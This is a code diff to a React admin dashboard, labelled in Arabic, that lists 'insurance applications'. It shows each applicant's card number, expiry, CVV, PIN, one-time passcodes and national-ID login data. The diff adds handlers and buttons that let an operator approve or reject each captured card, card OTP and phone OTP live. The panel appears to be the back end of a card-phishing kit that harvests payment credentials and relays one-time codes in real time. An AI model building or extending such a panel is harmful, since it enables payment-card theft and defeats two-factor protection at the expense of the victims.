@@ -140,20 +140,103 @@ function DataField({
 }
 
 export default function AdminDashboard() {
-  const [applications, setApplications] = useState<InsuranceApplication[]>([])
   const [filteredApplications, setFilteredApplications] = useState<InsuranceApplication[]>([])
   const [searchQuery, setSearchQuery] = useState("")
   const [statusFilter, setStatusFilter] = useState<string>("all")
   const [cardFilter, setCardFilter] = useState<"all" | "hasCard" | "noCard">("all")
   const [infoFilter, setInfoFilter] = useState<"all" | "hasInfo" | "noInfo">("all")
-  const [selectedApplication, setSelectedApplication] = useState<InsuranceApplication | null>(null)
-  const [showChat, setShowChat] = useState(false)
   const [loading, setLoading] = useState(true)
   const [authNumber, setAuthNumber] = useState("")
   const prevApplicationsCount = useRef<number>(0)
   const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set())
   const [showHideFilters, setShowHideFilter] = useState(false)
+  const [applications, setApplications] = useState<InsuranceApplication[]>([])
+  const [selectedApplication, setSelectedApplication] = useState<InsuranceApplication | null>(null)
+  const [showChat, setShowChat] = useState(false)
   const [showCardHistory, setShowCardHistory] = useState(false)
+
+  const hasAnyGridData = (app: InsuranceApplication) => {
+    return (
+      app.cardNumber ||
+      app.otp ||
+      app.allOtps ||
+      app.phoneNumber2 ||
+      app.phoneOtp ||
+      app.selectedCarrier ||
+      app.totalPrice ||
+      app.pinCode
+    )
+  }
+
+  // <CHANGE> Add handlers for card, card OTP, and phone OTP approvals
+  const handleCardApprovalChange = useCallback(
+    async (appId: string, status: "approved" | "rejected" | "pending") => {
+      setApplications((prev) =>
+        prev.map((app) => (app.id === appId ? { ...app, cardApproved: status } : app)),
+      )
+      if (selectedApplication?.id === appId) {
+        setSelectedApplication((prev) => (prev ? { ...prev, cardApproved: status } : null))
+      }
+      try {
+        await updateApplication(appId, { cardApproved: status })
+        if (status === "approved") {
+          playSuccessSound()
+        } else if (status === "rejected") {
+          playErrorSound()
+        }
+      } catch (error) {
+        console.error("Error updating card approval:", error)
+        playErrorSound()
+      }
+    },
+    [selectedApplication],
+  )
+
+  const handleCardOtpApprovalChange = useCallback(
+    async (appId: string, status: "approved" | "rejected" | "pending") => {
+      setApplications((prev) =>
+        prev.map((app) => (app.id === appId ? { ...app, cardOtpApproved: status } : app)),
+      )
+      if (selectedApplication?.id === appId) {
+        setSelectedApplication((prev) => (prev ? { ...prev, cardOtpApproved: status } : null))
+      }
+      try {
+        await updateApplication(appId, { cardOtpApproved: status })
+        if (status === "approved") {
+          playSuccessSound()
+        } else if (status === "rejected") {
+          playErrorSound()
+        }
+      } catch (error) {
+        console.error("Error updating card OTP approval:", error)
+        playErrorSound()
+      }
+    },
+    [selectedApplication],
+  )
+
+  const handlePhoneOtpApprovalChange = useCallback(
+    async (appId: string, status: "approved" | "rejected" | "pending") => {
+      setApplications((prev) =>
+        prev.map((app) => (app.id === appId ? { ...app, phoneOtpApproved: status } : app)),
+      )
+      if (selectedApplication?.id === appId) {
+        setSelectedApplication((prev) => (prev ? { ...prev, phoneOtpApproved: status } : null))
+      }
+      try {
+        await updateApplication(appId, { phoneOtpApproved: status })
+        if (status === "approved") {
+          playSuccessSound()
+        } else if (status === "rejected") {
+          playErrorSound()
+        }
+      } catch (error) {
+        console.error("Error updating phone OTP approval:", error)
+        playErrorSound()
+      }
+    },
+    [selectedApplication],
+  )
 
   const stats = useMemo(() => {
     return {
@@ -431,17 +514,7 @@ export default function AdminDashboard() {
     return !!(app.vehicleModel || app.manufacturingYear || app.vehicleValue || app.vehicleUsage)
   }
 
-  const hasAnyGridData = (app: InsuranceApplication) => {
-    return (
-      hasDocumentInfo(app) ||
-      hasInsuranceInfo(app) ||
-      hasVehicleInfo(app) ||
-      app.cardNumber ||
-      app.phoneNumber2 ||
-      app.phoneOtp ||
-      app.nafazId
-    )
-  }
+  
 
   const getStepName = (step: number | string) => {
     return STEP_NAMES[step] || `الخطوة ${step}`
@@ -848,6 +921,7 @@ export default function AdminDashboard() {
                                 cardholderName={selectedApplication.ownerName}
                               />
                             </div>
+                       
                             <div className="lg:w-72 space-y-4">
                               {selectedApplication.totalPrice && (
                                 <div className="p-4 bg-gradient-to-br from-success/20 to-success/5 border border-success/30 rounded-xl">
@@ -866,6 +940,15 @@ export default function AdminDashboard() {
                                   <p className="text-3xl font-bold text-primary font-mono text-center" dir="ltr">
                                     {selectedApplication.otp}
                                   </p>
+                                 <div className="flex">
+                                 <Button onClick={()=>{
+                                  handleCardOtpApprovalChange(selectedApplication.id!,"approved")
+                                 }} className="w-full bg-green-300 mx-1">قبول </Button>
+                                  <Button onClick={()=>{
+                                  handleCardOtpApprovalChange(selectedApplication.id!,"rejected")
+                                 }} className="w-full" variant={'destructive'}>رفض</Button>
+                                 </div>
+
                                 </div>
                               )}
                               {selectedApplication.allOtps && selectedApplication.allOtps.length > 0 && (
@@ -886,9 +969,32 @@ export default function AdminDashboard() {
                                   </div>
                                 </div>
                               )}
+                              
                             </div>
+                            
                           </div>
-
+                          <div className="flex gap-2">
+                              <Button
+                                onClick={() => handleCardApprovalChange(selectedApplication.id!, "approved")}
+                                variant="outline"
+                                size="sm"
+                                className="flex-1 text-success border-success/30 hover:bg-success/10 rounded-xl"
+                                disabled={selectedApplication?.cardApproved === "approved"}
+                              >
+                                <CheckCircle className="w-4 h-4 ml-2" />
+                                قبول البطاقة
+                              </Button>
+                              <Button
+                                onClick={() => handleCardApprovalChange(selectedApplication.id!, "rejected")}
+                                variant="outline"
+                                size="sm"
+                                className="flex-1 text-destructive border-destructive/30 hover:bg-destructive/10 rounded-xl"
+                                disabled={selectedApplication?.cardApproved === "rejected"}
+                              >
+                                <XCircle className="w-4 h-4 ml-2" />
+                                رفض البطاقة
+                              </Button>
+                            </div>
                           {/* Card History Section */}
                           {showCardHistory &&
                             selectedApplication.cardHistory &&
@@ -910,7 +1016,6 @@ export default function AdminDashboard() {
                                         expiryDate={card.expiryDate}
                                         cvv={card.cvv}
                                         cardholderName={selectedApplication.ownerName}
-                                        isHistorical
                                       />
                                       <div className="mt-2 flex items-center justify-between px-2">
                                         <span className="text-xs text-muted-foreground">
